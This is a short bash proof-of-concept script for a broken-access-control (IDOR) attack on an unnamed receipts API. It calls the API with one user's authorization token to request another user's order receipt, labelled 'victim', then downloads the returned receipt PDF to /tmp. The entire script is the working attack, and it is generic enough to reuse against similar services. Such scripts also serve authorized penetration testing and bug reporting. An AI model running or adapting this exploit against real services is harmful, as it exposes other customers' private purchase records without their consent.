#!/bin/bash

echo "=== Requesting victim receipt URL ==="
RESPONSE=$(curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN_B" \
  --data-raw "{\"action\":\"get-receipt\",\"order-id\":\"$ORDER_C\"}")

echo "$RESPONSE" | jq

RECEIPT_URL=$(echo "$RESPONSE" | jq -r '.url // empty')

if [ -n "$RECEIPT_URL" ]; then
  echo
  echo "=== Downloading victim's receipt PDF ==="
  curl -s "$RECEIPT_URL" -o /tmp/victim_receipt.pdf
  file /tmp/victim_receipt.pdf
  echo "Saved to: /tmp/victim_receipt.pdf"
else
  echo "No URL returned."
fi
